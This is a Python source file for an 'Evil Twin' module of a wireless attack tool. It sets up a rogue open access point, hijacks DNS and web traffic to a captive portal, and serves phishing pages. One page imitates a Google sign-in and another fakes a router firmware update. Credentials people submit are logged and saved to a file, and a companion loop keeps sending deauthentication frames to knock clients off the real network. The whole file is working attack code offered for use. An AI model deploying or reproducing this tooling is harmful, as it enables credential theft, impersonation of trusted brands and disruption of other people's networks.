#!/usr/bin/env python3
"""
PyAirgeddon Evil Twin Module
Rogue AP, Captive Portal, and Credential Harvesting
Requires: Linux with hostapd, dnsmasq, iptables
"""

import subprocess
import threading
import time
import os
import signal
import socket
import http.server
import socketserver
import urllib.parse
import json
from typing import Callable, Optional, List, Dict
from dataclasses import dataclass, field
from datetime import datetime
import tempfile


@dataclass
class CapturedCredential:
    """Captured credential from captive portal"""
    timestamp: str
    client_ip: str
    client_mac: str = ""
    ssid: str = ""
    password: str = ""
    extra_fields: Dict[str, str] = field(default_factory=dict)


# ============================================================================
# CAPTIVE PORTAL TEMPLATES
# ============================================================================

CAPTIVE_PORTAL_TEMPLATES = {
    'generic': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Authentication</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 80px; height: 80px; fill: #00d4ff; }
        h1 { color: #fff; text-align: center; margin-bottom: 10px; font-size: 1.8em; }
        .subtitle { color: #a0a0a0; text-align: center; margin-bottom: 30px; font-size: 0.9em; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #ccc; margin-bottom: 8px; font-size: 0.9em; }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.3);
            color: #fff;
            font-size: 1em;
            transition: all 0.3s ease;
        }
        input:focus { outline: none; border-color: #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); }
        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(135deg, #00d4ff, #0099ff);
            color: #fff;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0, 212, 255, 0.4); }
        .ssid-display { 
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid rgba(0, 212, 255, 0.3);
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            margin-bottom: 25px;
        }
        .ssid-display span { color: #00d4ff; font-weight: bold; }
        .footer { color: #666; text-align: center; margin-top: 20px; font-size: 0.8em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z"/></svg>
        </div>
        <h1>WiFi Login</h1>
        <p class="subtitle">Please enter network credentials to continue</p>
        <div class="ssid-display">Connecting to: <span>{SSID}</span></div>
        <form action="/login" method="POST">
            <div class="form-group">
                <label>Network Password</label>
                <input type="password" name="password" placeholder="Enter WiFi password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
        <p class="footer">Secure WiFi Authentication Portal</p>
    </div>
</body>
</html>''',

    'router_update': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Firmware Update</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: #1a1a1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #2d2d2d;
            border-radius: 10px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }
        .header { 
            background: linear-gradient(135deg, #ff6b6b, #ee5a5a);
            margin: -30px -30px 25px -30px;
            padding: 20px 30px;
            border-radius: 10px 10px 0 0;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .header svg { width: 40px; height: 40px; fill: #fff; }
        .header h1 { color: #fff; font-size: 1.3em; }
        .warning {
            background: rgba(255, 107, 107, 0.1);
            border: 1px solid #ff6b6b;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            color: #ff6b6b;
        }
        .warning strong { display: block; margin-bottom: 5px; }
        label { display: block; color: #aaa; margin-bottom: 8px; }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #444;
            border-radius: 6px;
            background: #1a1a1a;
            color: #fff;
            margin-bottom: 20px;
        }
        input:focus { outline: none; border-color: #ff6b6b; }
        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            background: linear-gradient(135deg, #ff6b6b, #ee5a5a);
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover { opacity: 0.9; }
        .info { color: #666; font-size: 0.85em; margin-top: 15px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg viewBox="0 0 24 24"><path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M11,16H13V18H11V16M11,6H13V14H11V6Z"/></svg>
            <h1>Critical Firmware Update</h1>
        </div>
        <div class="warning">
            <strong>⚠ Security Update Required</strong>
            Your router firmware needs to be updated. Please authenticate to continue.
        </div>
        <form action="/login" method="POST">
            <label>Router Admin Password</label>
            <input type="password" name="password" placeholder="Enter admin password" required>
            <input type="hidden" name="ssid" value="{SSID}">
            <button type="submit">Verify & Update</button>
        </form>
        <p class="info">This update will improve security and performance.</p>
    </div>
</body>
</html>''',

    'google_signin': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Roboto', Arial, sans-serif;
            background: #f0f4f9;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            border-radius: 8px;
            padding: 45px 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo { text-align: center; margin-bottom: 15px; }
        .logo span { font-size: 24px; font-weight: 500; }
        .logo .g { color: #4285f4; }
        .logo .o1 { color: #ea4335; }
        .logo .o2 { color: #fbbc05; }
        .logo .g2 { color: #4285f4; }
        .logo .l { color: #34a853; }
        .logo .e { color: #ea4335; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; color: #202124; }
        .subtitle { color: #5f6368; text-align: center; margin-bottom: 30px; font-size: 16px; }
        .form-group { margin-bottom: 25px; }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.2s;
        }
        input:focus { outline: none; border-color: #4285f4; box-shadow: 0 0 0 1px #4285f4; }
        .forgot { color: #1a73e8; font-size: 14px; text-decoration: none; display: block; margin-bottom: 30px; }
        .btn-container { display: flex; justify-content: space-between; align-items: center; }
        .create { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
        button {
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            background: #1a73e8;
            color: #fff;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        button:hover { background: #1557b0; }
        .wifi-notice { background: #e8f0fe; border-radius: 4px; padding: 12px; margin-bottom: 25px; color: #1967d2; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Free WiFi</p>
        <div class="wifi-notice">🔒 Sign in required for network: <strong>{SSID}</strong></div>
        <form action="/login" method="POST">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <input type="hidden" name="ssid" value="{SSID}">
            <a href="#" class="forgot">Forgot password?</a>
            <div class="btn-container">
                <a href="#" class="create">Create account</a>
                <button type="submit">Next</button>
            </div>
        </form>
    </div>
</body>
</html>''',

    'success': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        body { 
            font-family: -apple-system, sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }
        .container { text-align: center; padding: 40px; }
        .check { 
            width: 80px; height: 80px;
            background: linear-gradient(135deg, #00d4ff, #0099ff);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
            animation: pulse 2s infinite;
        }
        .check svg { width: 40px; height: 40px; fill: #fff; }
        h1 { margin-bottom: 10px; }
        p { color: #a0a0a0; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="check">
            <svg viewBox="0 0 24 24"><path d="M9,20.42L2.79,14.21L5.62,11.38L9,14.77L18.88,4.88L21.71,7.71L9,20.42Z"/></svg>
        </div>
        <h1>Successfully Connected!</h1>
        <p>You now have internet access. Enjoy!</p>
    </div>
</body>
</html>'''
}


# ============================================================================
# CREDENTIAL HARVESTER HTTP SERVER
# ============================================================================

class CredentialHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP handler for captive portal"""
    
    portal_html = ""
    success_html = CAPTIVE_PORTAL_TEMPLATES['success']
    credentials = []  # Shared credential storage
    log_callback = None
    
    def log_message(self, format, *args):
        """Override to use our logging"""
        if CredentialHandler.log_callback:
            CredentialHandler.log_callback(f"[HTTP] {args[0]}")
    
    def do_GET(self):
        """Serve captive portal page for any GET request"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(self.portal_html.encode())
    
    def do_POST(self):
        """Handle form submission"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse form data
        params = urllib.parse.parse_qs(post_data)
        
        # Extract credentials
        credential = CapturedCredential(
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            client_ip=self.client_address[0],
            password=params.get('password', [''])[0],
            ssid=params.get('ssid', [''])[0]
        )
        
        # Extra fields (email, etc.)
        for key, value in params.items():
            if key not in ['password', 'ssid']:
                credential.extra_fields[key] = value[0] if value else ''
        
        CredentialHandler.credentials.append(credential)
        
        if CredentialHandler.log_callback:
            CredentialHandler.log_callback(f"[+] CREDENTIAL CAPTURED!")
            CredentialHandler.log_callback(f"    IP: {credential.client_ip}")
            CredentialHandler.log_callback(f"    Password: {credential.password}")
            if credential.extra_fields:
                for k, v in credential.extra_fields.items():
                    CredentialHandler.log_callback(f"    {k}: {v}")
        
        # Redirect to success page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(self.success_html.encode())


# ============================================================================
# EVIL TWIN ACCESS POINT
# ============================================================================

class EvilTwinAP:
    """
    Creates a rogue access point mimicking a target network
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.http_server = None
        self.http_thread = None
        self.credentials: List[CapturedCredential] = []
        self.temp_dir = tempfile.mkdtemp(prefix='pyairgeddon_et_')
        
    def start(self, ssid: str, channel: int = 6,
              template: str = 'generic',
              gateway_ip: str = '10.0.0.1',
              log_callback: Callable = None) -> bool:
        """
        Start Evil Twin AP with captive portal
        ssid: Network name to spoof
        channel: Channel to operate on
        template: Captive portal template
        gateway_ip: IP for the AP interface
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting Evil Twin AP: {ssid}")
        log(f"[*] Channel: {channel}, Interface: {self.interface}")
        
        try:
            # Stop any existing services
            subprocess.run(['systemctl', 'stop', 'NetworkManager'], capture_output=True)
            subprocess.run(['systemctl', 'stop', 'wpa_supplicant'], capture_output=True)
            
            # Configure interface
            log("[*] Configuring interface...")
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], capture_output=True)
            subprocess.run(['ip', 'addr', 'flush', self.interface], capture_output=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], capture_output=True)
            subprocess.run(['ip', 'addr', 'add', f'{gateway_ip}/24', 'dev', self.interface], capture_output=True)
            
            # Create hostapd config
            hostapd_conf = f"""interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
            hostapd_conf_path = os.path.join(self.temp_dir, 'hostapd.conf')
            with open(hostapd_conf_path, 'w') as f:
                f.write(hostapd_conf)
            
            # Create dnsmasq config
            dnsmasq_conf = f"""interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,{gateway_ip}
dhcp-option=6,{gateway_ip}
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/{gateway_ip}
"""
            dnsmasq_conf_path = os.path.join(self.temp_dir, 'dnsmasq.conf')
            with open(dnsmasq_conf_path, 'w') as f:
                f.write(dnsmasq_conf)
            
            # Start hostapd
            log("[*] Starting hostapd...")
            self.hostapd_process = subprocess.Popen(
                ['hostapd', hostapd_conf_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            time.sleep(2)
            
            if self.hostapd_process.poll() is not None:
                log("[-] hostapd failed to start")
                return False
            
            # Start dnsmasq
            log("[*] Starting dnsmasq...")
            self.dnsmasq_process = subprocess.Popen(
                ['dnsmasq', '-C', dnsmasq_conf_path, '-d'],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            time.sleep(1)
            
            # Configure iptables for captive portal redirect
            log("[*] Configuring iptables...")
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
            subprocess.run(['iptables', '-F'], capture_output=True)
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', 
                          '--dport', '80', '-j', 'DNAT', '--to-destination', f'{gateway_ip}:80'], 
                          capture_output=True)
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', 
                          '--dport', '443', '-j', 'DNAT', '--to-destination', f'{gateway_ip}:80'], 
                          capture_output=True)
            
            # Start HTTP server for captive portal
            log("[*] Starting captive portal...")
            portal_html = CAPTIVE_PORTAL_TEMPLATES.get(template, CAPTIVE_PORTAL_TEMPLATES['generic'])
            portal_html = portal_html.replace('{SSID}', ssid)
            
            CredentialHandler.portal_html = portal_html
            CredentialHandler.credentials = self.credentials
            CredentialHandler.log_callback = log_callback
            
            self.http_server = socketserver.TCPServer((gateway_ip, 80), CredentialHandler)
            
            def serve_forever():
                self.http_server.serve_forever()
            
            self.http_thread = threading.Thread(target=serve_forever, daemon=True)
            self.http_thread.start()
            
            self.running = True
            log("[+] Evil Twin AP started successfully!")
            log(f"[+] SSID: {ssid}")
            log(f"[+] Gateway: {gateway_ip}")
            log("[*] Waiting for victims...")
            
            return True
            
        except Exception as e:
            log(f"[-] Error starting Evil Twin: {e}")
            self.stop(log_callback)
            return False
    
    def stop(self, log_callback: Callable = None):
        """Stop Evil Twin AP"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log("[*] Stopping Evil Twin AP...")
        self.running = False
        
        # Stop HTTP server
        if self.http_server:
            self.http_server.shutdown()
        
        # Stop hostapd
        if self.hostapd_process:
            self.hostapd_process.terminate()
            try:
                self.hostapd_process.wait(timeout=2)
            except:
                self.hostapd_process.kill()
        
        # Stop dnsmasq
        if self.dnsmasq_process:
            self.dnsmasq_process.terminate()
            try:
                self.dnsmasq_process.wait(timeout=2)
            except:
                self.dnsmasq_process.kill()
        
        # Clean up iptables
        subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
        subprocess.run(['iptables', '-F'], capture_output=True)
        
        # Restart NetworkManager
        subprocess.run(['systemctl', 'start', 'NetworkManager'], capture_output=True)
        
        log("[+] Evil Twin AP stopped")
    
    def get_credentials(self) -> List[CapturedCredential]:
        """Get captured credentials"""
        return self.credentials
    
    def save_credentials(self, filepath: str, log_callback: Callable = None) -> bool:
        """Save credentials to file"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        try:
            with open(filepath, 'w') as f:
                for cred in self.credentials:
                    f.write(f"[{cred.timestamp}] IP: {cred.client_ip} | Password: {cred.password}\n")
                    for k, v in cred.extra_fields.items():
                        f.write(f"    {k}: {v}\n")
            log(f"[+] Credentials saved to {filepath}")
            return True
        except Exception as e:
            log(f"[-] Error saving credentials: {e}")
            return False
    
    def cleanup(self):
        """Clean up temporary files"""
        import shutil
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass


# ============================================================================
# DEAUTH COMPANION FOR EVIL TWIN
# ============================================================================

class EvilTwinDeauth:
    """
    Companion deauth attack to force clients to reconnect to Evil Twin
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.process = None
    
    def start_deauth(self, target_bssid: str, client_mac: str = None,
                     interval: float = 0.5, log_callback: Callable = None):
        """Continuously deauth clients from target AP"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        target = client_mac or 'FF:FF:FF:FF:FF:FF'
        log(f"[*] Starting companion deauth on {target_bssid}")
        
        self.running = True
        
        def deauth_loop():
            while self.running:
                try:
                    cmd = [
                        'aireplay-ng',
                        '--deauth', '2',
                        '-a', target_bssid,
                    ]
                    if client_mac:
                        cmd.extend(['-c', client_mac])
                    cmd.append(self.interface)
                    
                    subprocess.run(cmd, capture_output=True, timeout=5)
                    time.sleep(interval)
                except:
                    pass
        
        threading.Thread(target=deauth_loop, daemon=True).start()
    
    def stop(self, log_callback: Callable = None):
        """Stop deauth"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        self.running = False
        log("[+] Companion deauth stopped")


# ============================================================================
# MAIN (for testing)
# ============================================================================

if __name__ == "__main__":
    print("[*] PyAirgeddon Evil Twin Module")
    print("-" * 40)
    print("[*] Available captive portal templates:")
    for name in CAPTIVE_PORTAL_TEMPLATES:
        print(f"    - {name}")
    print("\n[!] This module requires root privileges and Linux")
